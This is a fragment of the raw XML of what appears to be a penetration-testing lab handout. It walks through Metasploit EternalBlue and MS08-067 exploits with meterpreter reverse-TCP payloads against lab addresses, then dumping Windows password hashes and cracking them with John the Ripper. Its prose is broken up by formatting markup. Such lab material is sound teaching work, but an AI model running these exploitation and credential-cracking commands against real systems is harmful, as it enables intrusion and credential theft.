          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="412" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="3873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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>use exploit/windows/smb/ms17_010_eternalblue set payload windows/meterpreter/reverse_tcp set ReverseAllowProxy true</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1" w:line="413" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="6778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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>set rhosts 172.31.1.14 set lhost &lt;Kali_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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CC6600"/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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ul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: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xp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oit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ils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(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x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pected).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Ex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>p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loit</w:t>
      </w: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 xml:space="preserve"> 172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.</w:t>
      </w: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31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w: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1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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1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2</w:t>
      </w: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>(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 xml:space="preserve">XP PRO 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>sp</w:t>
      </w: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2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)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="4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>w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ith Net</w:t>
      </w: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A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PI</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Ba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ck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in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eta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oit:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>back</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ec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igu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ox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y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ins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et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ings if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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>setg Proxies socks5:127.0.0.1:1080</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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un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he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tAP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 exploit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(o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 l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ne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)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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>search exploit netapi</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="39"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>use exploit/windows/smb/ms08_067_netapi</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="411" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="4005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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>set payload/windows/meterpreter/reverse_tcp set ReverseAllowProxy true</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="2" w:line="413" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="6778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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>set rhosts 172.31.1.12 set lhost &lt;Kali_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ul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: Y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u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uld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ceive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ete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eter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ss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XR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Y.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Du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>m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p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Pas</w:t>
      </w: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>w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ord Ha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h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In the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ete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eter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mp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,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y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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>hashdump</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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x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mine 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ped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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Cra</w:t>
      </w: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 xml:space="preserve">k the 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>H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as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>h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es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 xml:space="preserve"> w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 xml:space="preserve">ith </w:t>
      </w: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J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ohn</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Copy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he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sh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ump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into a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ew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ile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ng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sep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.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v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s:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/home/kali/hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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un the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ollow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ng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ext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ct only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(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line):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">cut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">d ':' </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f1,4 /home/kali/hashes.txt &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/home/kali/nt_only_hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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V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eri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y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y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ur file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w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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ure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J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n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no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v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ed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history.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rm ~/.john/john.pot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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un Jo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 to cr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ck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h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hes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ing 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fa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ult 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w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or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list (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ne lin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):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>john -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wordlist=/usr/share/john/password.lst -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>format=nt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/home/kali/nt_only_hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2122" w:right="5084"/>
        <w:jc w:val="center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ote: To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e-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un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om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scra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,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pacing w:val="-4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st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cl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J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’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histo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y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rm ~/.john/john.pot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="216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n run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J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hn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ga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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>john -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wordlist=/usr/share/john/password.lst -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>format=nt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/home/kali/nt_only_hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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A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nal</w:t>
      </w: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y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>z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e Cra</w:t>
      </w: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 xml:space="preserve">ked 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>R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ults</w:t>
      </w:r>
    </w:p>
